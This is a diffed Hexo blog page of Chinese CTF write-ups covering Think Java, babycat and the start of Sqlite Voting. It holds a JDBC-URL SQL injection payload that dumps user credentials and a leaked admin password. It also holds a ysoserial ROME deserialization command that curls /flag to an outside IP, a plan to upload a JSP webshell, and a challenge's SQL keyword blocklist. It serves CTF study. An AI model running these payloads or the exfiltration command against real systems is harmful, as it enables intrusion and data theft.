-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;fa7bcb65-99a0-4643-93c2-93cacaaf442c&#125;</span><br></pre></td></tr></table></div></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;fa7bcb65-99a0-4643-93c2-93cacaaf442c&#125;</span><br></pre></td></tr></table></figure>
 
-
-        <h2 id="网鼎杯-2020-朱雀组-Think-Java"   >
-          <a href="#网鼎杯-2020-朱雀组-Think-Java" class="heading-link"><i class="fas fa-link"></i></a><a href="#网鼎杯-2020-朱雀组-Think-Java" class="headerlink" title="[网鼎杯 2020 朱雀组]Think Java"></a>[网鼎杯 2020 朱雀组]Think Java</h2>
-      <p>嘿嘿做的第一道Java题，记录一下Java应该怎么入手，首先目录扫描，扫出了<code>swagger-ui.html</code>，可以看到这个web页面使用的所有API<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209081837086.png"></p>
+<h2 id="网鼎杯-2020-朱雀组-Think-Java"><a href="#网鼎杯-2020-朱雀组-Think-Java" class="headerlink" title="[网鼎杯 2020 朱雀组]Think Java"></a>[网鼎杯 2020 朱雀组]Think Java</h2><p>嘿嘿做的第一道Java题，记录一下Java应该怎么入手，首先目录扫描，扫出了<code>swagger-ui.html</code>，可以看到这个web页面使用的所有API<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209081837086.png"></p>
 <p>看代码是<code>/common/test/sqlDict</code>这一路径的调用，其中dbName是我们传参内容，跟进其中的SqlDict.getTableData，查看getConnection方法，其中本质是通过jdbc接口进行数据库连接，而jdbc在解析数据库时类似于对URL的解析</p>
 <blockquote>
 <p>JDBC 的 URL 也类似 http 请求中的 URL，也可以使用锚点 # 或者 ? 如：jdbc:mysql://mysqldbserver:3306/myapp#’ union select 2#</p>
@@ -69,472 +420,731 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.0.0"></he
 <p>也就是#后面的内容会被忽略，但是这部分信息依然会被传递到dbName参数中进行接下来的查询</p>
 <p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209081837304.png"></p>
 <p>那我们就可以直接构造出sql注入的语句</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dbName=myapp#&#x27; union select group_concat(name,0x3a,pwd)from user#</span><br><span class="line">构造出的语句</span><br><span class="line">Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema = &#x27;myapp#&#x27; union select group_concat(name,0x3a,pwd)from user#后面的不重要</span><br></pre></td></tr></table></div></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dbName=myapp#&#x27; union select group_concat(name,0x3a,pwd)from user#</span><br><span class="line">构造出的语句</span><br><span class="line">Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema = &#x27;myapp#&#x27; union select group_concat(name,0x3a,pwd)from user#后面的不重要</span><br></pre></td></tr></table></figure>
 
 <p>拿到用户名和密码<code>admin:admin@Rrrr_ctf_asde</code></p>
 <p>登录成功拿到token，发现是Java序列化后内容</p>
 <p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209081917768.png"></p>
 <p>并且将内容提交到currentAPI中时，也会返回用户信息，yso构造序列化攻击即可</p>
-<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Users/jlan/Library/Java/JavaVirtualMachines/azul-1.8.0_332/Contents/Home/bin/java -jar /Users/jlan/Documents/Tools/ysoserial-all.jar ROME &quot;curl http://182.61.46.138:1000 -d @/flag&quot; |base64</span><br></pre></td></tr></table></div></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Users/jlan/Library/Java/JavaVirtualMachines/azul-1.8.0_332/Contents/Home/bin/java -jar /Users/jlan/Documents/Tools/ysoserial-all.jar ROME &quot;curl http://182.61.46.138:1000 -d @/flag&quot; |base64</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209081932780.png"></p>
-
-        <h2 id="GKCTF-2021-babycat"   >
-          <a href="#GKCTF-2021-babycat" class="heading-link"><i class="fas fa-link"></i></a><a href="#GKCTF-2021-babycat" class="headerlink" title="[GKCTF 2021]babycat"></a>[GKCTF 2021]babycat</h2>
-      <p>快乐java题，靶机启动真的好慢，上来就是一个nt登录界面，登录不行，注册未开放<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209131744693.png"></p>
+<h2 id="GKCTF-2021-babycat"><a href="#GKCTF-2021-babycat" class="headerlink" title="[GKCTF 2021]babycat"></a>[GKCTF 2021]babycat</h2><p>快乐java题，靶机启动真的好慢，上来就是一个nt登录界面，登录不行，注册未开放<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209131744693.png"></p>
 <p>但是点击注册查看源代码发现是注册逻辑被注释，按照注释的逻辑构造payload注册，成功注册并登录<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209131745556.png"></p>
 <p>进入主页发电文件上传需要admin权限，并且在download存在文件泄露，先看web.xml内容，根据内容将class文件依次下载，下面我们主要查看uploadServlet和registerServlet</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE web-app PUBLIC</span><br><span class="line"> &quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot;</span><br><span class="line"> &quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot; &gt;</span><br><span class="line"></span><br><span class="line">&lt;web-app&gt;</span><br><span class="line">  &lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;register&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.web.servlet.registerServlet&lt;/servlet-class&gt;</span><br><span class="line">  &lt;/servlet&gt;</span><br><span class="line">  &lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;login&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.web.servlet.loginServlet&lt;/servlet-class&gt;</span><br><span class="line">  &lt;/servlet&gt;</span><br><span class="line">  &lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;home&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.web.servlet.homeServlet&lt;/servlet-class&gt;</span><br><span class="line">  &lt;/servlet&gt;</span><br><span class="line">  &lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;upload&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.web.servlet.uploadServlet&lt;/servlet-class&gt;</span><br><span class="line">  &lt;/servlet&gt;</span><br><span class="line">  &lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;download&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.web.servlet.downloadServlet&lt;/servlet-class&gt;</span><br><span class="line">  &lt;/servlet&gt;</span><br><span class="line">  &lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;logout&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.web.servlet.logoutServlet&lt;/servlet-class&gt;</span><br><span class="line">  &lt;/servlet&gt;</span><br><span class="line">  &lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;logout&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/logout&lt;/url-pattern&gt;</span><br><span class="line">  &lt;/servlet-mapping&gt;</span><br><span class="line">  &lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;download&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/home/download&lt;/url-pattern&gt;</span><br><span class="line">  &lt;/servlet-mapping&gt;</span><br><span class="line">  &lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;register&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/register&lt;/url-pattern&gt;</span><br><span class="line">  &lt;/servlet-mapping&gt;</span><br><span class="line">  &lt;display-name&gt;java&lt;/display-name&gt;</span><br><span class="line">  &lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;login&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/login&lt;/url-pattern&gt;</span><br><span class="line">  &lt;/servlet-mapping&gt;</span><br><span class="line">  &lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;home&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/home&lt;/url-pattern&gt;</span><br><span class="line">  &lt;/servlet-mapping&gt;</span><br><span class="line">  &lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;upload&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/home/upload&lt;/url-pattern&gt;</span><br><span class="line">  &lt;/servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line">  &lt;filter&gt;</span><br><span class="line">    &lt;filter-name&gt;loginFilter&lt;/filter-name&gt;</span><br><span class="line">    &lt;filter-class&gt;com.web.filter.LoginFilter&lt;/filter-class&gt;</span><br><span class="line">  &lt;/filter&gt;</span><br><span class="line">  &lt;filter-mapping&gt;</span><br><span class="line">    &lt;filter-name&gt;loginFilter&lt;/filter-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/home/*&lt;/url-pattern&gt;</span><br><span class="line">  &lt;/filter-mapping&gt;</span><br><span class="line">  &lt;display-name&gt;java&lt;/display-name&gt;</span><br><span class="line"></span><br><span class="line">  &lt;welcome-file-list&gt;</span><br><span class="line">    &lt;welcome-file&gt;/WEB-INF/index.jsp&lt;/welcome-file&gt;</span><br><span class="line">  &lt;/welcome-file-list&gt;</span><br><span class="line">&lt;/web-app&gt;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE web-app PUBLIC</span><br><span class="line"> &quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot;</span><br><span class="line"> &quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot; &gt;</span><br><span class="line"></span><br><span class="line">&lt;web-app&gt;</span><br><span class="line">  &lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;register&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.web.servlet.registerServlet&lt;/servlet-class&gt;</span><br><span class="line">  &lt;/servlet&gt;</span><br><span class="line">  &lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;login&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.web.servlet.loginServlet&lt;/servlet-class&gt;</span><br><span class="line">  &lt;/servlet&gt;</span><br><span class="line">  &lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;home&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.web.servlet.homeServlet&lt;/servlet-class&gt;</span><br><span class="line">  &lt;/servlet&gt;</span><br><span class="line">  &lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;upload&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.web.servlet.uploadServlet&lt;/servlet-class&gt;</span><br><span class="line">  &lt;/servlet&gt;</span><br><span class="line">  &lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;download&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.web.servlet.downloadServlet&lt;/servlet-class&gt;</span><br><span class="line">  &lt;/servlet&gt;</span><br><span class="line">  &lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;logout&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.web.servlet.logoutServlet&lt;/servlet-class&gt;</span><br><span class="line">  &lt;/servlet&gt;</span><br><span class="line">  &lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;logout&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/logout&lt;/url-pattern&gt;</span><br><span class="line">  &lt;/servlet-mapping&gt;</span><br><span class="line">  &lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;download&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/home/download&lt;/url-pattern&gt;</span><br><span class="line">  &lt;/servlet-mapping&gt;</span><br><span class="line">  &lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;register&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/register&lt;/url-pattern&gt;</span><br><span class="line">  &lt;/servlet-mapping&gt;</span><br><span class="line">  &lt;display-name&gt;java&lt;/display-name&gt;</span><br><span class="line">  &lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;login&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/login&lt;/url-pattern&gt;</span><br><span class="line">  &lt;/servlet-mapping&gt;</span><br><span class="line">  &lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;home&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/home&lt;/url-pattern&gt;</span><br><span class="line">  &lt;/servlet-mapping&gt;</span><br><span class="line">  &lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;upload&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/home/upload&lt;/url-pattern&gt;</span><br><span class="line">  &lt;/servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line">  &lt;filter&gt;</span><br><span class="line">    &lt;filter-name&gt;loginFilter&lt;/filter-name&gt;</span><br><span class="line">    &lt;filter-class&gt;com.web.filter.LoginFilter&lt;/filter-class&gt;</span><br><span class="line">  &lt;/filter&gt;</span><br><span class="line">  &lt;filter-mapping&gt;</span><br><span class="line">    &lt;filter-name&gt;loginFilter&lt;/filter-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/home/*&lt;/url-pattern&gt;</span><br><span class="line">  &lt;/filter-mapping&gt;</span><br><span class="line">  &lt;display-name&gt;java&lt;/display-name&gt;</span><br><span class="line"></span><br><span class="line">  &lt;welcome-file-list&gt;</span><br><span class="line">    &lt;welcome-file&gt;/WEB-INF/index.jsp&lt;/welcome-file&gt;</span><br><span class="line">  &lt;/welcome-file-list&gt;</span><br><span class="line">&lt;/web-app&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>那我们该如何成为admin呢，直接看注册类中的关键代码</p>
-<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!StringUtils.isNullOrEmpty(role)) &#123;</span><br><span class="line">    <span class="keyword">var</span> = <span class="keyword">var</span>.replace(role, <span class="string">&quot;\&quot;role\&quot;:\&quot;guest\&quot;&quot;</span>);</span><br><span class="line">    person = (Person)gson.fromJson(<span class="keyword">var</span>, Person.class);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    person = (Person)gson.fromJson(<span class="keyword">var</span>, Person.class);</span><br><span class="line">    person.setRole(<span class="string">&quot;guest&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!StringUtils.isNullOrEmpty(role)) &#123;</span><br><span class="line">    <span class="keyword">var</span> = <span class="keyword">var</span>.replace(role, <span class="string">&quot;\&quot;role\&quot;:\&quot;guest\&quot;&quot;</span>);</span><br><span class="line">    person = (Person)gson.fromJson(<span class="keyword">var</span>, Person.class);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    person = (Person)gson.fromJson(<span class="keyword">var</span>, Person.class);</span><br><span class="line">    person.setRole(<span class="string">&quot;guest&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>此处对我们传入的data注册信息进行了处理，将role的json内容换成了guest，也就是说我们直接更改data中的role属性是行不通的，这里我们可以使用unicode字符绕过，并且在属性中多添加一层内容使其中包含了role属性来确保我们能够进入第一个判断，构造出的payload如下</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></div></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>注册成功并且成功进入文件上传界面<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209131804530.png"> </p>
 <p>传一个jsp马到static目录下连接即可</p>
 <p>但是似乎buu的这个版本是修复后的，对文件内容进行了过滤，没法传🐎，我有什么办法（</p>
-
-        <h2 id="HarekazeCTF2019-Sqlite-Voting"   >
-          <a href="#HarekazeCTF2019-Sqlite-Voting" class="heading-link"><i class="fas fa-link"></i></a><a href="#HarekazeCTF2019-Sqlite-Voting" class="headerlink" title="[HarekazeCTF2019]Sqlite Voting"></a>[HarekazeCTF2019]Sqlite Voting</h2>
-      <p>源码全是过滤</p>
-<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$banword</span> = [</span><br><span class="line">    <span class="comment">// dangerous chars</span></span><br><span class="line">    <span class="comment">// &quot; % &#x27; * + / &lt; = &gt; \ _ ` ~ -</span></span><br><span class="line">    <span class="string">&quot;[\&quot;%&#x27;*+\\/&lt;=&gt;\\\\_`~-]&quot;</span>,</span><br><span class="line">    <span class="comment">// whitespace chars</span></span><br><span class="line">    <span class="string">&#x27;\s&#x27;</span>,</span><br><span class="line">    <span class="comment">// dangerous functions</span></span><br><span class="line">    <span class="string">&#x27;blob&#x27;</span>, <span class="string">&#x27;load_extension&#x27;</span>, <span class="string">&#x27;char&#x27;</span>, <span class="string">&#x27;unicode&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;(in|sub)str&#x27;</span>, <span class="string">&#x27;[lr]trim&#x27;</span>, <span class="string">&#x27;like&#x27;</span>, <span class="string">&#x27;glob&#x27;</span>, <span class="string">&#x27;match&#x27;</span>, <span class="string">&#x27;regexp&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;in&#x27;</span>, <span class="string">&#x27;limit&#x27;</span>, <span class="string">&#x27;order&#x27;</span>, <span class="string">&#x27;union&#x27;</span>, <span class="string">&#x27;join&#x27;</span></span><br><span class="line">  ];</span><br><span class="line">  <span class="variable">$regexp</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$banword</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (preg_match(<span class="variable">$regexp</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(<span class="string">&quot;Content-Type: text/json; charset=utf-8&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// check user input</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>]) || <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">die</span>(json_encode([<span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;You must specify vote id&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!is_valid(<span class="variable">$id</span>)) &#123;</span><br><span class="line">  <span class="keyword">die</span>(json_encode([<span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Vote id contains dangerous chars&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// update database</span></span><br><span class="line"><span class="variable">$pdo</span> = <span class="keyword">new</span> PDO(<span class="string">&#x27;sqlite:../db/vote.db&#x27;</span>);</span><br><span class="line"><span class="variable">$res</span> = <span class="variable">$pdo</span>-&gt;query(<span class="string">&quot;UPDATE vote SET count = count + 1 WHERE id = $&#123;id&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$res</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">  <span class="keyword">die</span>(json_encode([<span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;An error occurred while updating database&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// succeeded!</span></span><br><span class="line"><span class="keyword">echo</span> json_encode([</span><br><span class="line">  <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Thank you for your vote! The result will be published after the CTF finished.&#x27;</span></span><br><span class="line">]);</span><br></pre></td></tr></table></div></figure>
+<h2 id="HarekazeCTF2019-Sqlite-Voting"><a href="#HarekazeCTF2019-Sqlite-Voting" class="headerlink" title="[HarekazeCTF2019]Sqlite Voting"></a>[HarekazeCTF2019]Sqlite Voting</h2><p>源码全是过滤</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$banword</span> = [</span><br><span class="line">    <span class="comment">// dangerous chars</span></span><br><span class="line">    <span class="comment">// &quot; % &#x27; * + / &lt; = &gt; \ _ ` ~ -</span></span><br><span class="line">    <span class="string">&quot;[\&quot;%&#x27;*+\\/&lt;=&gt;\\\\_`~-]&quot;</span>,</span><br><span class="line">    <span class="comment">// whitespace chars</span></span><br><span class="line">    <span class="string">&#x27;\s&#x27;</span>,</span><br><span class="line">    <span class="comment">// dangerous functions</span></span><br><span class="line">    <span class="string">&#x27;blob&#x27;</span>, <span class="string">&#x27;load_extension&#x27;</span>, <span class="string">&#x27;char&#x27;</span>, <span class="string">&#x27;unicode&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;(in|sub)str&#x27;</span>, <span class="string">&#x27;[lr]trim&#x27;</span>, <span class="string">&#x27;like&#x27;</span>, <span class="string">&#x27;glob&#x27;</span>, <span class="string">&#x27;match&#x27;</span>, <span class="string">&#x27;regexp&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;in&#x27;</span>, <span class="string">&#x27;limit&#x27;</span>, <span class="string">&#x27;order&#x27;</span>, <span class="string">&#x27;union&#x27;</span>, <span class="string">&#x27;join&#x27;</span></span><br><span class="line">  ];</span><br><span 